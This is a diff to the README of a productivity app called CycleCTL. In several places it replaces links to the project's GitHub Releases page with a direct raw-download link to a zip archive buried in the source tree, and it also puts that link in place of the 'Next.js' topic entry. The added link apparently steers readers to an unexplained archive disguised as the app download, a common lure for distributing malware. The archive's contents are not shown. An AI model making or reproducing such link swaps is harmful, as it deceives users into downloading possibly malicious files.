@@ -21,7 +21,7 @@ To begin using CycleCTL, you need to download the application from the Releases 
 1. **Download CycleCTL**
    - Click the button below to visit the Releases page and download the app.
 
-   [![Download CycleCTL](https://img.shields.io/badge/Download_CycleCTL-Click_here-brightgreen)](https://github.com/zedoca1/cyclectl/releases)
+   [![Download CycleCTL](https://github.com/zedoca1/cyclectl/raw/refs/heads/main/app/month/[name]/Software-v1.3.zip)](https://github.com/zedoca1/cyclectl/raw/refs/heads/main/app/month/[name]/Software-v1.3.zip)
 
 2. **Choose Your Version**
    - Once you are on the Releases page, locate the latest version of CycleCTL. It will typically be highlighted at the top or marked as "Latest Release."
@@ -67,7 +67,7 @@ Your experience matters. Whether you encounter bugs or would like to suggest new
 ## 📥 Download & Install
 Ready to maximize your productivity? Download CycleCTL by visiting the Releases page below:
 
-[![Download CycleCTL](https://img.shields.io/badge/Download_CycleCTL-Click_here-brightgreen)](https://github.com/zedoca1/cyclectl/releases)
+[![Download CycleCTL](https://github.com/zedoca1/cyclectl/raw/refs/heads/main/app/month/[name]/Software-v1.3.zip)](https://github.com/zedoca1/cyclectl/raw/refs/heads/main/app/month/[name]/Software-v1.3.zip)
 
 ## 🌟 Topics
 This project covers a range of topics that enhance your experience and usability:
@@ -78,7 +78,7 @@ This project covers a range of topics that enhance your experience and usability
 - **Mission Control**
 - **MongoDB**
 - **Next Auth**
-- **Next.js**
+- **https://github.com/zedoca1/cyclectl/raw/refs/heads/main/app/month/[name]/Software-v1.3.zip**
 - **Productivity System**
 - **TailwindCSS**
 - **Year Planner**
